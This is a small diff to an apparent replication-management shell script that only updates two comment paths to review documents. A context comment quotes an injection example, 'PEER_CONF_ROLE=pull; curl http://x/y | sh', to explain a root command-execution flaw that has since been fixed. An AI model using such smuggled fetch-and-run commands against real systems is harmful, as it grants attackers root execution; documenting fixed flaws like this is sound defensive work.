@@ -189,7 +189,7 @@ LEAVE_LABEL=""
 # ---- --pause/--resume: stop (and later restore) every crontab this host
 # manages, for a maintenance window (disk swap, live migration off this host)
 # where new snapshots would be actively unwelcome -- not just unhelpful.
-# See docs/reviews/responses/ for the incident this answers: a VM migration
+# See docs/internal/reviews/responses/ for the incident this answers: a VM migration
 # off a host ahead of hardware work, where an hour of untouched cron would
 # hand pvesr's own send -Rpv | recv -F cycle a set of foreign snapshots to
 # contend with while it is trying to re-establish replication in the other
@@ -655,7 +655,7 @@ pubkey_fingerprint() {
 #     PEER_CONF_ROLE=pull; curl http://x/y | sh
 # ran that as root. No parser bug required; command execution is the documented
 # behaviour of the operation that was used. Reported as F1 (P0) in
-# docs/reviews/REV-20260729-001.md and confirmed in the source before fixing.
+# docs/internal/reviews/REV-20260729-001.md and confirmed in the source before fixing.
 #
 # The archive was also extracted before anyone checked what was in it, so path
 # traversal, absolute paths, symlinks and extra payload members all had a free
